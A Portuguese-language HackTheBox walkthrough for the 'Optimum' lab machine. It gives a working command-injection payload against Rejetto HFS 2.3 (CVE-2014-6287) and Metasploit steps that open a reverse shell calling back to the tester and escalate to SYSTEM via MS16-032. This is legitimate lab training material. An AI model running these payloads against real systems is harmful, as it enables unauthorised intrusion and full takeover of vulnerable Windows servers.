Optimum

HackTheBox · Easy by Brenno M.

Optimum roda o HttpFileServer 2.3, vulnerável a injeção de macros pelo parâmetro de busca (CVE-2014-6287), que dá shell como kostas. A escalação usa o MS16-032 (CVE-2016-0099), uma falha no Secondary Logon do Windows Server 2012 R2.

Reconhecimento

A única porta aberta é a 80, com o Rejetto HFS 2.3.

nmap -Pn -n -sT --min-rate 1500 -p- <IP>
nmap -Pn -n -sT -sV -sC -p80 <IP>
# 80 HttpFileServer httpd 2.3

Exploração - CVE-2014-6287

O HFS para de filtrar o parâmetro search depois de um byte nulo, e o que vem depois é interpretado pela linguagem de macros dele, incluindo {.exec|...}. Dá para testar com um ping de volta antes de usar o módulo do Metasploit.

sudo tcpdump -i tun0 icmp
curl "http://<IP>/?search=%00{.exec|cmd.exe+/c+ping+-n+1+<MEU_IP>.}"

msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <IP>
set LHOST <MEU_IP>
run
getuid   # OPTIMUM\kostas
cat C:/Users/kostas/Desktop/user.txt

Escalação - MS16-032

O sysinfo mostra um Windows Server 2012 R2 x64, mas o Meterpreter é x86. O exploit do MS16-032 precisa de um processo 64 bits, então migramos para um (como o explorer.exe) antes de rodá-lo.

sysinfo
ps
migrate <PID_x64>
background
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
set LHOST <MEU_IP>
set LPORT 4445
run
getuid   # NT AUTHORITY\SYSTEM
cat C:/Users/Administrator/Desktop/root.txt
